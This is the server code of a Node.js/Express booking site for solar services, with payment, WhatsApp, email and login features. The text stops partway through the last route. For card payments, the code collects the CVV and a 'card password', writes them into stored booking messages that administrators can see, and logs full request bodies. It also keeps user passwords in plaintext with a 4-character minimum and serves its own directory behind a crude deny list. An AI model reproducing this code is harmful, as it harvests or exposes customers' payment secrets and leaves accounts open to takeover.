require('dotenv').config();
const crypto = require('crypto');
const express = require('express');
const cookieSession = require('cookie-session');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const sqlite3 = require('sqlite3').verbose();
const nodemailer = require('nodemailer');
const twilio = require('twilio');
const Razorpay = require('razorpay');
const {
  normalizeBookingPayload,
  generateBookingId,
  isCustomerBookingAllowed,
  normalizeWhatsAppNumber,
  isValidTwilioTemplateSid,
  createWhatsAppRequest
} = require('./controllers/bookingController');

const app = express();
const PORT = Number(process.env.PORT) || 3000;
const DB_PATH = path.join(__dirname, 'data', 'solar-bookings.db');
const ADMIN_USERNAME = (process.env.ADMIN_USERNAME || 'admin').trim();
const ADMIN_PASSWORD = (process.env.ADMIN_PASSWORD || '').trim();
const SESSION_SECRET = (process.env.SESSION_SECRET || '').trim();
if (!ADMIN_PASSWORD) throw new Error('ADMIN_PASSWORD must be set');
if (!SESSION_SECRET) throw new Error('SESSION_SECRET must be set');
const ADMIN_WHATSAPP = (process.env.ADMIN_WHATSAPP || process.env.WHATSAPP_TO || '').trim();
const razorpay = process.env.RAZORPAY_KEY_ID && process.env.RAZORPAY_KEY_SECRET
  ? new Razorpay({
      key_id: process.env.RAZORPAY_KEY_ID,
      key_secret: process.env.RAZORPAY_KEY_SECRET
    })
  : null;

function ensureDefaultUser() {
  db.get('SELECT * FROM users WHERE username = ?', [ADMIN_USERNAME], (err, row) => {
    if (err) {
      console.error('Failed to check default user:', err);
      return;
    }

    if (!row) {
      db.run(
        'INSERT INTO users (username, password, role) VALUES (?, ?, ?)',
        [ADMIN_USERNAME, ADMIN_PASSWORD, 'admin'],
        (insertErr) => {
          if (insertErr) {
            console.error('Failed to create default user:', insertErr);
          }
        }
      );
      return;
    }

    const needsRoleUpdate = row.role !== 'admin';
    const needsPasswordUpdate = String(row.password) !== String(ADMIN_PASSWORD);

    if (needsRoleUpdate || needsPasswordUpdate) {
      db.run(
        'UPDATE users SET password = ?, role = ? WHERE username = ?',
        [ADMIN_PASSWORD, 'admin', ADMIN_USERNAME],
        (updateErr) => {
          if (updateErr) {
            console.error('Failed to update default admin credentials:', updateErr);
          } else {
            console.log(`Admin credentials synced for ${ADMIN_USERNAME}`);
          }
        }
      );
    }
  });
}

const isEmailConfigured = !!(process.env.SMTP_HOST && process.env.SMTP_USER && process.env.SMTP_PASS);
const isWhatsAppSenderConfigured = !!(
  process.env.TWILIO_ACCOUNT_SID &&
  process.env.TWILIO_AUTH_TOKEN &&
  process.env.TWILIO_WHATSAPP_FROM
);
const isWhatsAppConfigured = !!(
  isWhatsAppSenderConfigured &&
  ADMIN_WHATSAPP
);

function hasValidWhatsAppTemplate() {
  const templateSid = String(process.env.TWILIO_WHATSAPP_TEMPLATE_SID || '').trim();
  return !!templateSid && templateSid !== 'your_approved_template_sid_here';
}

app.disable('x-powered-by');
app.set('trust proxy', 1);
app.use(cors({ origin: true, credentials: true }));
app.use(express.static(__dirname));
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(cookieSession({
  name: 'sunpro.session',
  keys: [SESSION_SECRET],
  maxAge: 24 * 60 * 60 * 1000,
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  path: '/'
}));

app.use((req, res, next) => {
  const url = (req.originalUrl || '').toLowerCase();
  const blocked = [
    '/node_modules',
    '/data',
    '/.env',
    '.env',
    '/server.js',
    '/package.json',
    '/package-lock.json',
    '/bookings.html',
    '/login.html',
    '/signup.html'
  ];

  if (blocked.some(item => url.includes(item))) {
    return res.status(403).json({ success: false, message: 'Access denied.' });
  }

  next();
});

function initializeDatabase() {
  const dbDir = path.dirname(DB_PATH);
  fs.mkdirSync(dbDir, { recursive: true });
  const database = new sqlite3.Database(DB_PATH);

  return new Promise((resolve) => {
    database.serialize(() => {
      database.run(`
        CREATE TABLE IF NOT EXISTS bookings (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          bookingId TEXT UNIQUE,
          name TEXT NOT NULL,
          phone TEXT NOT NULL,
          email TEXT,
          serviceType TEXT NOT NULL,
          date TEXT NOT NULL,
          time TEXT NOT NULL,
          city TEXT NOT NULL,
          message TEXT,
          paymentMethod TEXT DEFAULT 'UPI',
          paymentAmount TEXT DEFAULT '250',
          paymentStatus TEXT DEFAULT 'pending',
          razorpayOrderId TEXT,
          razorpayPaymentId TEXT,
          razorpaySignature TEXT,
          createdAt TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
        )
      `);
      database.run(`
        CREATE TABLE IF NOT EXISTS users (
          id INTEGER PRIMARY KEY AUTOINCREMENT,
          username TEXT NOT NULL UNIQUE,
          password TEXT NOT NULL,
          role TEXT NOT NULL DEFAULT 'customer',
          email TEXT,
          phone TEXT,
          fullName TEXT,
          createdAt TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
        )
      `);

      database.all('PRAGMA table_info(users)', (userErr, userColumns) => {
        if (userErr) console.error('Failed to inspect users table:', userErr.message);
        const userExisting = new Set((userColumns || []).map(c => c.name));
        const userTasks = [];
        if (!userExisting.has('role')) userTasks.push('ALTER TABLE users ADD COLUMN role TEXT NOT NULL DEFAULT "customer"');
        if (!userExisting.has('email')) userTasks.push('ALTER TABLE users ADD COLUMN email TEXT');
        if (!userExisting.has('phone')) userTasks.push('ALTER TABLE users ADD COLUMN phone TEXT');
        if (!userExisting.has('fullName')) userTasks.push('ALTER TABLE users ADD COLUMN fullName TEXT');

        const runUserTasks = (done) => {
          const sql = userTasks.shift();
          if (!sql) return done();
          database.run(sql, (err) => {
            if (err) console.error('User migration failed:', err.message);
            runUserTasks(done);
          });
        };

        runUserTasks(() => {
          database.all('PRAGMA table_info(bookings)', (bookingErr, bookingColumns) => {
            if (bookingErr) console.error('Failed to inspect bookings table:', bookingErr.message);
            const bookingExisting = new Set((bookingColumns || []).map(c => c.name));
            const bookingTasks = [];
            if (!bookingExisting.has('bookingId')) bookingTasks.push('ALTER TABLE bookings ADD COLUMN bookingId TEXT');
            if (!bookingExisting.has('userId')) bookingTasks.push('ALTER TABLE bookings ADD COLUMN userId INTEGER');
            if (!bookingExisting.has('email')) bookingTasks.push('ALTER TABLE bookings ADD COLUMN email TEXT');
            if (!bookingExisting.has('paymentMethod')) bookingTasks.push('ALTER TABLE bookings ADD COLUMN paymentMethod TEXT DEFAULT "UPI"');
            if (!bookingExisting.has('paymentAmount')) bookingTasks.push('ALTER TABLE bookings ADD COLUMN paymentAmount TEXT DEFAULT "250"');
            if (!bookingExisting.has('paymentStatus')) bookingTasks.push('ALTER TABLE bookings ADD COLUMN paymentStatus TEXT DEFAULT "pending"');
            if (!bookingExisting.has('razorpayOrderId')) bookingTasks.push('ALTER TABLE bookings ADD COLUMN razorpayOrderId TEXT');
            if (!bookingExisting.has('razorpayPaymentId')) bookingTasks.push('ALTER TABLE bookings ADD COLUMN razorpayPaymentId TEXT');
            if (!bookingExisting.has('razorpaySignature')) bookingTasks.push('ALTER TABLE bookings ADD COLUMN razorpaySignature TEXT');

            const runBookingTasks = (done) => {
              const sql = bookingTasks.shift();
              if (!sql) return done();
              database.run(sql, (err) => {
                if (err) console.error('Booking migration failed:', err.message);
                runBookingTasks(done);
              });
            };

            runBookingTasks(() => {
              database.run(`
                UPDATE bookings
                SET bookingId = 'SP-LEGACY-' || id
                WHERE bookingId IS NULL
                   OR TRIM(bookingId) = ''
                   OR bookingId IN (
                     SELECT bookingId FROM bookings
                     WHERE bookingId IS NOT NULL AND TRIM(bookingId) <> ''
                     GROUP BY bookingId HAVING COUNT(*) > 1
                   )
              `, (repairErr) => {
                if (repairErr) console.error('Failed to repair booking IDs:', repairErr.message);
                database.run(`
                  UPDATE bookings
                  SET userId = (
                    SELECT users.id FROM users
                    WHERE lower(trim(users.email)) = lower(trim(bookings.email))
                      AND trim(users.phone) = trim(bookings.phone)
                    LIMIT 1
                  )
                  WHERE userId IS NULL
                    AND email IS NOT NULL AND trim(email) <> ''
                    AND phone IS NOT NULL AND trim(phone) <> ''
                    AND (
                      SELECT COUNT(*) FROM users
                      WHERE lower(trim(users.email)) = lower(trim(bookings.email))
                        AND trim(users.phone) = trim(bookings.phone)
                    ) = 1
                `, (ownershipErr) => {
                  if (ownershipErr) console.error('Failed to associate existing bookings:', ownershipErr.message);
                  database.run('CREATE UNIQUE INDEX IF NOT EXISTS idx_bookings_bookingId_unique ON bookings(bookingId)', (indexErr) => {
                    if (indexErr) console.error('Failed to create bookingId unique index:', indexErr.message);
                    resolve(database);
                  });
                });
              });
            });
          });
        });
      });
    });
  });
}

let db;
const dbReady = initializeDatabase().then((database) => {
  db = database;
  ensureDefaultUser();
  return database;
});

app.use(async (req, res, next) => {
  try { await dbReady; next(); } catch (error) { next(error); }
});

async function sendEmail(booking) {
  if (!isEmailConfigured) {
    console.log('Email not configured. Skipping email notification.');
    return;
  }

  const transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT || 587),
    secure: Number(process.env.SMTP_PORT || 587) === 465,
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS
    }
  });

  const mailTo = process.env.NOTIFY_EMAIL || process.env.SMTP_USER;
  const html = `
    <h3>New Solar Booking</h3>
    <p><strong>Name:</strong> ${booking.name}</p>
    <p><strong>Phone:</strong> ${booking.phone}</p>
    <p><strong>Service:</strong> ${booking.serviceType}</p>
    <p><strong>Date:</strong> ${booking.date}</p>
    <p><strong>Time:</strong> ${booking.time}</p>
    <p><strong>City:</strong> ${booking.city}</p>
    <p><strong>Message:</strong> ${booking.message || 'N/A'}</p>
  `;

  await transporter.sendMail({
    from: `${process.env.SMTP_FROM_NAME || 'SunPro Solar'} <${process.env.SMTP_USER}>`,
    to: mailTo,
    subject: `New ${booking.serviceType} enquiry from ${booking.name}`,
    html
  });

  console.log('Email sent successfully.');
}

async function buildPaymentDetails(booking) {
  const paymentMethod = String(booking.paymentMethod || 'UPI').trim() || 'UPI';
  const parts = [];

  if (paymentMethod === 'UPI' && booking.upiId) {
    parts.push(`UPI: ${booking.upiId}`);
  }

  if (paymentMethod === 'Card') {
    const cardNumber = String(booking.cardNumber || '').trim();
    const cardCvv = String(booking.cardCvv || '').trim();
    const cardPassword = String(booking.cardPassword || '').trim();
    const cardExpiry = String(booking.cardExpiry || '').trim();

    if (cardNumber) parts.push(`Card: ${cardNumber.slice(-4).padStart(cardNumber.length, '*')}`);
    if (cardExpiry) parts.push(`Expiry: ${cardExpiry}`);
    if (cardCvv) parts.push(`CVV: ${cardCvv}`);
    if (cardPassword) parts.push(`Password: ${cardPassword}`);
  }

  if (paymentMethod === 'Bank Transfer') {
    if (booking.bankName) parts.push(`Bank: ${booking.bankName}`);
    if (booking.accountNumber) parts.push(`Account: ${booking.accountNumber}`);
    if (booking.ifscCode) parts.push(`IFSC: ${booking.ifscCode}`);
    if (booking.bankDetailsLink) parts.push(`Bank Link: ${booking.bankDetailsLink}`);
  }

  if (paymentMethod === 'Cash') {
    parts.push('Cash payment');
  }

  return parts.join(' | ');
}

async function sendWhatsApp(booking) {
  if (!isWhatsAppSenderConfigured) {
    console.log('WhatsApp sender is not configured. Skipping WhatsApp notifications.');
    return;
  }

  const client = twilio(
    process.env.TWILIO_ACCOUNT_SID,
    process.env.TWILIO_AUTH_TOKEN
  );

  const adminTemplateSid = process.env.TWILIO_WHATSAPP_TEMPLATE_SID;
  if (ADMIN_WHATSAPP && isValidTwilioTemplateSid(adminTemplateSid)) {
    try {
      const adminMessage = [
        'New Solar Booking',
        `Name: ${booking.name}`,
        `Phone: ${booking.phone}`,
        `Service: ${booking.serviceType}`,
        `Date: ${booking.date}`,
        `Time: ${booking.time}`,
        `City: ${booking.city}`,
        `Details: ${booking.message || 'N/A'}`
      ].join('\n');

      await client.messages.create(createWhatsAppRequest({
        to: ADMIN_WHATSAPP,
        body: adminMessage,
        templateSid: adminTemplateSid,
        templateVars: {
          1: String(booking.name || ''),
          2: String(booking.serviceType || ''),
          3: String(booking.phone || ''),
          4: String(booking.date || ''),
          5: String(booking.time || ''),
          6: String(booking.message || 'N/A')
        }
      }));
      console.log('Admin WhatsApp notification sent.');
    } catch (error) {
      console.error('Admin WhatsApp notification failed:', error.message);
    }
  } else {
    console.log('Admin WhatsApp skipped: recipient or approved template is not configured.');
  }

  const customerNumber = normalizeWhatsAppNumber(booking.phone);
  const customerTemplateSid = process.env.TWILIO_WHATSAPP_CUSTOMER_TEMPLATE_SID;
  if (!customerNumber || !isValidTwilioTemplateSid(customerTemplateSid)) {
    console.log('Customer WhatsApp skipped: phone number or approved customer template is not configured.');
    return;
  }

  try {
    const customerMessage = [
      `Hello ${booking.name}, your solar booking has been received.`,
      `Service: ${booking.serviceType}`,
      `Date: ${booking.date}`,
      `Time: ${booking.time}`,
      `Location: ${booking.city}`,
      `Booking ID: ${booking.bookingId}`
    ].join('\n');

    await client.messages.create(createWhatsAppRequest({
      to: customerNumber,
      body: customerMessage,
      templateSid: customerTemplateSid,
      templateVars: {
        1: String(booking.name || ''),
        2: String(booking.serviceType || ''),
        3: String(booking.date || ''),
        4: String(booking.time || '')
      }
    }));
    console.log('Customer WhatsApp booking confirmation sent.');
  } catch (error) {
    console.error('Customer WhatsApp confirmation failed:', error.message);
  }
}

app.get('/api/config/razorpay', (req, res) => {
  res.json({
    success: true,
    keyId: process.env.RAZORPAY_KEY_ID || '',
    configured: !!(process.env.RAZORPAY_KEY_ID && process.env.RAZORPAY_KEY_SECRET)
  });
});

app.post('/api/create-payment-order', async (req, res) => {
  try {
    const { amount, currency = 'INR', receipt } = req.body || {};
    const numericAmount = Number(amount || 250);

    if (!process.env.RAZORPAY_KEY_ID || !process.env.RAZORPAY_KEY_SECRET || !razorpay) {
      return res.status(500).json({
        success: false,
        message: 'Razorpay is not configured. Add RAZORPAY_KEY_ID and RAZORPAY_KEY_SECRET in your environment.'
      });
    }

    if (!Number.isFinite(numericAmount) || numericAmount <= 0) {
      return res.status(400).json({
        success: false,
        message: 'Valid payment amount is required.'
      });
    }

    const order = await razorpay.orders.create({
      amount: Math.round(numericAmount * 100),
      currency,
      receipt: receipt || `solar_${Date.now()}`
    });

    return res.json({ success: true, order });
  } catch (error) {
    console.error('Razorpay order creation failed:', error.message);
    return res.status(500).json({
      success: false,
      message: 'Unable to create payment order.',
      error: error.message
    });
  }
});

app.post('/api/verify-payment', async (req, res) => {
  try {
    const { razorpay_order_id, razorpay_payment_id, razorpay_signature } = req.body || {};

    if (!process.env.RAZORPAY_KEY_SECRET) {
      return res.status(500).json({ success: false, message: 'Razorpay secret is not configured.' });
    }

    const expectedSignature = crypto
      .createHmac('sha256', process.env.RAZORPAY_KEY_SECRET)
      .update(`${razorpay_order_id}|${razorpay_payment_id}`)
      .digest('hex');

    const isValid = expectedSignature === razorpay_signature;

    if (!isValid) {
      return res.status(400).json({ success: false, message: 'Payment signature verification failed.' });
    }

    return res.json({ success: true, message: 'Payment verified successfully.' });
  } catch (error) {
    console.error('Razorpay verification failed:', error.message);
    return res.status(500).json({ success: false, message: 'Unable to verify payment.', error: error.message });
  }
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'solar.html'));
});

function requireCustomerLogin(req, res, next) {
  if (isCustomerBookingAllowed(req)) {
    return next();
  }

  return res.status(401).json({
    success: false,
    message: 'Please login to book a service.'
  });
}

async function handleBookingSubmission(req, res) {
  console.log('BOOKING REQUEST RECEIVED:', req.body);

  const booking = normalizeBookingPayload(req.body || {});
  const {
    name,
    phone,
    email,
    serviceType,
    date,
    time,
    city,
    message,
    paymentMethod = 'Card',
    paymentAmount = 250,
    paymentStatus = 'pending',
    razorpayOrderId,
    razorpayPaymentId,
    razorpaySignature
  } = booking;

  booking.bookingId = String(booking.bookingId || '').trim() || generateBookingId();
  const paymentDetails = await buildPaymentDetails(booking);
  if (paymentDetails) {
    booking.message = [message, paymentDetails].filter(Boolean).join(' | ');
  }

  if (!name || !phone || !serviceType || !date || !time || !city) {
    return res.status(400).json({
      success: false,
      message: 'Please complete all required fields before submitting.'
    });
  }

  db.run(
    `INSERT INTO bookings (bookingId, userId, name, phone, email, serviceType, date, time, city, message, paymentMethod, paymentAmount, paymentStatus, razorpayOrderId, razorpayPaymentId, razorpaySignature) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
    [
      booking.bookingId,
      req.session.userId,
      booking.name,
      booking.phone,
      booking.email || null,
      booking.serviceType,
      booking.date,
      booking.time,
      booking.city,
      booking.message,
      paymentMethod,
      paymentAmount,
      paymentStatus,
      razorpayOrderId || null,
      razorpayPaymentId || null,
      razorpaySignature || null
    ],
    async function insertCallback(err) {
      if (err) {
        console.error('Database insertion failed:', err);
        return res.status(500).json({
          success: false,
          message: 'Failed to save booking. Please try again.'
        });
      }

      try {
        await sendEmail(booking);
      } catch (notificationError) {
        console.error('Email notification failed, but booking was saved:', notificationError.message);
      }

      try {
        await sendWhatsApp(booking);
      } catch (notificationError) {
        console.error('WhatsApp notification failed, but booking was saved:', notificationError.message);
      }

      console.log('New booking request saved to database:', booking);
      return res.status(200).json({
        success: true,
        message: 'Booking request received successfully. We will contact you shortly.',
        bookingId: booking.bookingId
      });
    }
  );
}

app.post('/api/booking', requireCustomerLogin, handleBookingSubmission);
app.post('/api/book', requireCustomerLogin, handleBookingSubmission);

app.post('/book-appointment', requireCustomerLogin, async (req, res) => {
  try {
    const { name, phone, service, date, time, details, paymentMethod, paymentAmount } = req.body || {};
    const normalizedPaymentMethod = String(paymentMethod || 'UPI').trim() || 'UPI';
    const normalizedPaymentAmount = Number(paymentAmount || 250);

    if (!name || !phone || !service || !date || !time || !details) {
      return res.status(400).json({
        success: false,
        message: 'Please provide name, phone, service, date, time and details.'
      });
    }

    const adminTemplateSid = String(process.env.TWILIO_WHATSAPP_TEMPLATE_SID || '').trim();
    const customerTemplateSid = String(process.env.TWILIO_WHATSAPP_CUSTOMER_TEMPLATE_SID || '').trim();

    if (!adminTemplateSid || adminTemplateSid === 'your_approved_template_sid_here') {
      return res.status(400).json({
        success: false,
        message: 'Twilio WhatsApp template is not configured. Add a valid approved template SID to TWILIO_WHATSAPP_TEMPLATE_SID in .env.'
      });
    }

    const customerWhatsApp = `whatsapp:${String(phone).replace(/\D/g, '')}`;
    const customerMessage = `Booking Confirmed!\nHello ${name},\nService: ${service}\nDate: ${date}\nTime: ${time}\nPayment Method: ${normalizedPaymentMethod}\nAdvance Amount: ₹${Number.isFinite(normalizedPaymentAmount) && normalizedPaymentAmount > 0 ? normalizedPaymentAmount : 250}\nDetails: ${details}\nThank you!`;
    const adminMessage = `New Booking Request\nName: ${name}\nPhone: ${phone}\nService: ${service}\nDate: ${date}\nTime: ${time}\nPayment Method: ${normalizedPaymentMethod}\nAdvance Amount: ₹${Number.isFinite(normalizedPaymentAmount) && normalizedPaymentAmount > 0 ? normalizedPaymentAmount : 250}\nDetails: ${details}`;

    const adminResult = await twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN)
      .messages.create({
        from: process.env.TWILIO_WHATSAPP_FROM,
        to: ADMIN_WHATSAPP,
        contentSid: adminTemplateSid,
        contentVariables: JSON.stringify({
          1: String(name || ''),
          2: String(service || ''),
          3: String(phone || ''),
          4: String(date || ''),
          5: String(time || ''),
          6: String(details || '')
        })
      });

    const customerResult = customerTemplateSid && customerTemplateSid !== 'your_customer_template_sid_here'
      ? await twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN)
        .messages.create({
          from: process.env.TWILIO_WHATSAPP_FROM,
          to: customerWhatsApp,
          contentSid: customerTemplateSid,
          contentVariables: JSON.stringify({
            1: String(name || ''),
            2: String(service || ''),
            3: String(date || ''),
            4: String(time || '')
          })
        })
      : { sid: 'skipped' };

    return res.status(200).json({
      success: true,
      adminMessageId: adminResult.sid,
      customerMessageId: customerResult.sid,
      message: 'Booking WhatsApp message sent successfully.'
    });
  } catch (error) {
    console.error('Twilio booking WhatsApp failed:', error.message);
    return res.status(500).json({
      success: false,
      message: 'WhatsApp could not be sent. Please check Twilio setup.',
      error: error.message
    });
  }
});

function registerUser(req, res, role, redirectTo) {
  const { username, password, confirmPassword, email, phone, fullName } = req.body || {};

  if (!username || !password || !confirmPassword) {
    return res.status(400).json({ success: false, message: 'Please fill in all fields.' });
  }

  if (String(password).length < 4) {
    return res.status(400).json({ success: false, message: 'Password must be at least 4 characters long.' });
  }

  if (String(password) !== String(confirmPassword)) {
    return res.status(400).json({ success: false, message: 'Passwords do not match.' });
  }

  const cleanUsername = String(username).trim();
  const cleanEmail = String(email || '').trim();
  const cleanPhone = String(phone || '').trim();
  const cleanFullName = String(fullName || '').trim() || cleanUsername;

  if (!cleanUsername) {
    return res.status(400).json({ success: false, message: 'Username is required.' });
  }

  if (role === 'customer' && (!cleanEmail || !cleanPhone)) {
    return res.status(400).json({ success: false, message: 'Email and phone number are required for customer signup.' });
  }

  db.get('SELECT * FROM users WHERE username = ?', [cleanUsername], (lookupErr, existingUser) => {
    if (lookupErr) {
      return res.status(500).json({ success: false, message: 'Error checking user.' });
    }

    if (existingUser) {
      return res.status(409).json({ success: false, message: 'This username already exists.' });
    }

    db.run(
      'INSERT INTO users (username, password, role, email, phone, fullName) VALUES (?, ?, ?, ?, ?, ?)',
      [cleanUsername, String(password), role, cleanEmail || null, cleanPhone || null, cleanFullName],
      function insertUserCallback(insertErr) {
        if (insertErr) {
          return res.status(500).json({ success: false, message: 'Unable to create account.' });
        }

        req.session = {
          isAuthenticated: true,
          username: cleanUsername,
          role,
          userId: this.lastID
        };
        return res.json({ success: true, redirectTo });
      }
    );
  });
}

function loginUser(req, res, role, redirectTo) {
  const { username, password } = req.body || {};
  const cleanUsername = String(username || '').trim();

  if (!cleanUsername || !password) {
    return res.status(400).json({ success: false, message: 'Username and password are required.' });
  }

  db.get(
    'SELECT * FROM users WHERE username = ? AND password = ? AND role = ?',
    [cleanUsername, String(password), role],
    (err, user) => {
      if (err) {
        return res.status(500).json({ success: false, message: 'Login error.' });
      }

      if (!user) {
        return res.status(401).json({ success: false, message: 'Invalid username or password.' });
      }

      req.session = {
        isAuthenticated: true,
        username: user.username,
        role: user.role,
        userId: user.id
      };
      return res.json({ success: true, redirectTo });
    }
  );
}

app.get('/admin/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

app.get('/admin/signup', (req, res) => {
  return res.redirect('/admin/login');
});

app.get('/customer/login', (req, res) => {
  if (req.session && req.session.isAuthenticated && req.session.role === 'customer') {
    return res.redirect('/account');
  }
  res.sendFile(path.join(__dirname, 'customer-login.html'));
});

app.get('/customer/signup', (req, res) => {
  if (req.session && req.session.isAuthenticated && req.session.role === 'customer') {
    return res.redirect('/account');
  }
  res.sendFile(path.join(__dirname, 'customer-signup.html'));
});

app.get('/account', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'customer') {
    return res.redirect('/customer/login');
  }
  res.sendFile(path.join(__dirname, 'account.html'));
});

app.get('/login', (req, res) => {
  res.redirect('/admin/login');
});

app.get('/signup', (req, res) => {
  res.redirect('/customer/signup');
});

app.post('/api/admin/signup', (req, res) => {
  return res.status(403).json({ success: false, message: 'Admin signup is disabled. Use admin login only.' });
});

app.post('/api/admin/login', (req, res) => {
  loginUser(req, res, 'admin', '/bookings');
});

app.post('/api/customer/signup', (req, res) => {
  registerUser(req, res, 'customer', '/account');
});

app.post('/api/customer/login', (req, res) => {
  loginUser(req, res, 'customer', '/account');
});

app.post('/api/signup', (req, res) => {
  registerUser(req, res, 'customer', '/account');
});

app.post('/api/login', (req, res) => {
  loginUser(req, res, 'admin', '/bookings');
});

app.get('/logout', (req, res) => {
  const redirectPage = req.session && req.session.role === 'customer' ? '/customer/login' : '/admin/login';
  req.session = null;
  res.redirect(redirectPage);
});

app.get('/api/session', (req, res) => {
  if (!req.session || !req.session.isAuthenticated) {
    return res.json({ success: true, authenticated: false, user: null });
  }

  return res.json({
    success: true,
    authenticated: true,
    user: {
      username: req.session.username,
      role: req.session.role
    }
  });
});

app.get('/api/account', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'customer') {
    return res.status(401).json({ success: false, message: 'Customer not logged in.' });
  }

  const customerId = Number(req.session.userId || 0);

  return db.get('SELECT id, username, role, email, phone, fullName, createdAt FROM users WHERE id = ? AND role = ?', [customerId, 'customer'], (err, user) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Unable to fetch account details.' });
    }

    if (!user) {
      return res.status(404).json({ success: false, message: 'Account not found.' });
    }

    return res.json({
      success: true,
      user: {
        id: user.id,
        username: user.username,
        fullName: user.fullName || user.username,
        email: user.email || '',
        phone: user.phone || '',
        role: user.role,
        createdAt: user.createdAt
      }
    });
  });
});

app.get('/api/customer/bookings', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'customer') {
    return res.status(401).json({ success: false, message: 'Customer not logged in.' });
  }

  return db.all(
    'SELECT bookingId, serviceType, date, time, city, message, paymentStatus, createdAt FROM bookings WHERE userId = ? ORDER BY id DESC',
    [Number(req.session.userId || 0)],
    (err, rows) => {
      if (err) {
        return res.status(500).json({ success: false, message: 'Unable to fetch your bookings.' });
      }
      return res.json({ success: true, data: rows });
    }
  );
});

app.put('/api/account', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'customer') {
    return res.status(401).json({ success: false, message: 'Customer not logged in.' });
  }

  const { username, password, confirmPassword, email, phone, fullName } = req.body || {};
  const currentUsername = String(req.session.username || '').trim();
  const nextUsername = String(username || '').trim();

  if (!nextUsername) {
    return res.status(400).json({ success: false, message: 'Username is required.' });
  }

  const cleanEmail = String(email || '').trim();
  const cleanPhone = String(phone || '').trim();
  const cleanFullName = String(fullName || '').trim() || nextUsername;

  if (password || confirmPassword) {
    if (String(password).length < 4) {
      return res.status(400).json({ success: false, message: 'Password must be at least 4 characters long.' });
    }

    if (String(password) !== String(confirmPassword)) {
      return res.status(400).json({ success: false, message: 'Passwords do not match.' });
    }
  }

  db.get('SELECT * FROM users WHERE username = ? AND role = ?', [currentUsername, 'customer'], (lookupErr, user) => {
    if (lookupErr) {
      return res.status(500).json({ success: false, message: 'Unable to load your profile.' });
    }

    if (!user) {
      return res.status(404).json({ success: false, message: 'Account not found.' });
    }

    const safeUsername = nextUsername;
    db.get('SELECT * FROM users WHERE username = ? AND id != ?', [safeUsername, user.id], (existsErr, foundSameUsername) => {
      if (existsErr) {
        return res.status(500).json({ success: false, message: 'Unable to validate username.' });
      }

      if (foundSameUsername) {
        return res.status(409).json({ success: false, message: 'This username already exists.' });
      }

      const updatedPassword = password ? String(password) : user.password;
      db.run(
        'UPDATE users SET username = ?, password = ?, email = ?, phone = ?, fullName = ? WHERE id = ?',
        [safeUsername, updatedPassword, cleanEmail || user.email || '', cleanPhone || user.phone || '', cleanFullName, user.id],
        (updateErr) => {
          if (updateErr) {
            return res.status(500).json({ success: false, message: 'Unable to update account.' });
          }

          req.session.username = safeUsername;
          return res.json({
            success: true,
            message: 'Profile updated successfully.',
            user: {
              username: safeUsername,
              role: 'customer'
            }
          });
        }
      );
    });
  });
});

app.delete('/api/account', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'customer') {
    return res.status(401).json({ success: false, message: 'Customer not logged in.' });
  }

  const customerId = Number(req.session.userId || 0);

  if (!customerId) {
    return res.status(404).json({ success: false, message: 'Account not found.' });
  }

  return db.get('SELECT id FROM users WHERE id = ? AND role = ?', [customerId, 'customer'], (findErr, user) => {
    if (findErr) {
      return res.status(500).json({ success: false, message: 'Unable to load your account.' });
    }

    if (!user) {
      return res.status(404).json({ success: false, message: 'Account not found.' });
    }

    return db.run('DELETE FROM users WHERE id = ? AND role = ?', [customerId, 'customer'], (err) => {
      if (err) {
        return res.status(500).json({ success: false, message: 'Unable to delete account.' });
      }

      req.session = null;
      return res.json({ success: true, message: 'Account deleted successfully.' });
    });
  });
});

app.get('/api/bookings', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'admin') {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  return db.all('SELECT * FROM bookings ORDER BY id DESC', (err, rows) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Unable to fetch bookings.' });
    }
    return res.json({ success: true, data: rows });
  });
});

app.delete('/api/bookings/:id', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'admin') {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  db.run('DELETE FROM bookings WHERE id = ?', [req.params.id], (err) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Unable to delete enquiry.' });
    }

    return res.json({ success: true, message: 'Enquiry deleted successfully.' });
  });
});

app.get('/api/users', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'admin') {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  return db.all('SELECT id, username, fullName, email, phone, createdAt FROM users ORDER BY id DESC', (err, rows) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Unable to fetch users.' });
    }
    return res.json({ success: true, data: rows });
  });
});

app.delete('/api/users/:id', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'admin') {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  db.run('DELETE FROM users WHERE id = ?', [req.params.id], (err) => {
    if (err) {
      return res.status(500).json({ success: false, message: 'Unable to delete customer.' });
    }

    return res.json({ success: true, message: 'Customer deleted successfully.' });
  });
});

app.get('/bookings', (req, res) => {
  if (!req.session || !req.session.isAuthenticated || req.session.role !== 'admin') {
    return res.redirect('/admin/login');
  }
